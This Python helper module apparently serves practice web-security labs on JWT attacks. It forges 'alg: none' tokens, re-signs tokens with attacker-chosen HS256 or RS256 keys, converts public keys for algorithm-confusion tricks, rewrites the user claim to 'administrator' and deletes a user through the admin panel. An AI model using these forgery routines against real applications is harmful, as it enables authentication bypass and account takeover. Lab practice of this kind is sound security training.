import base64
import hashlib
import hmac
import json
import os
import sys
from urllib.parse import quote, urljoin

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from utils.base import LabSession


def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(value):
    padding_len = (-len(value)) % 4
    return base64.urlsafe_b64decode(value + ("=" * padding_len))


def decode_jwt(token):
    header_b64, payload_b64, signature_b64 = token.split(".")
    header = json.loads(b64url_decode(header_b64))
    payload = json.loads(b64url_decode(payload_b64))
    return header, payload, signature_b64


def encode_unsigned(header, payload):
    return ".".join([
        b64url_encode(json.dumps(header, separators=(",", ":")).encode()),
        b64url_encode(json.dumps(payload, separators=(",", ":")).encode()),
    ])


def sign_hs256(header, payload, secret):
    body = encode_unsigned(header, payload)
    sig = hmac.new(secret, body.encode(), hashlib.sha256).digest()
    return f"{body}.{b64url_encode(sig)}"


def sign_rs256(header, payload, private_key):
    body = encode_unsigned(header, payload)
    sig = private_key.sign(body.encode(), padding.PKCS1v15(), hashes.SHA256())
    return f"{body}.{b64url_encode(sig)}"


def make_none_token(payload):
    return encode_unsigned({"alg": "none", "typ": "JWT"}, payload) + "."


def generate_rsa_key():
    return rsa.generate_private_key(public_exponent=65537, key_size=2048)


def jwk_from_public_key(public_key, kid):
    numbers = public_key.public_numbers()
    return {
        "kty": "RSA",
        "kid": kid,
        "use": "sig",
        "alg": "RS256",
        "n": b64url_encode(numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, "big")),
        "e": b64url_encode(numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, "big")),
    }


def public_key_from_jwk(jwk):
    n = int.from_bytes(b64url_decode(jwk["n"]), "big")
    e = int.from_bytes(b64url_decode(jwk["e"]), "big")
    return rsa.RSAPublicNumbers(e, n).public_key()


def public_key_to_pem_bytes(public_key):
    return public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def load_public_key_bytes(path):
    with open(path, "rb") as key_file:
        key = serialization.load_pem_public_key(key_file.read())
    return public_key_to_pem_bytes(key)


def get_session_token(lab):
    token = lab.session.cookies.get("session")
    if not token:
        lab.fail("No session JWT found after login.")
    return token


def become_admin_payload(token):
    header, payload, _ = decode_jwt(token)
    for key in ("sub", "username", "user"):
        if key in payload:
            payload[key] = "administrator"
    if "administrator" in payload:
        payload["administrator"] = True
    return header, payload


def set_session(lab, token):
    lab.session.cookies.set("session", quote(token, safe=""))


def delete_carlos(lab):
    lab.get("/admin")
    lab.get("/admin/delete?username=carlos")
    lab.check_solved()


def lab_session(description):
    return LabSession(description=description)


def absolute_url(base_url, path):
    return urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
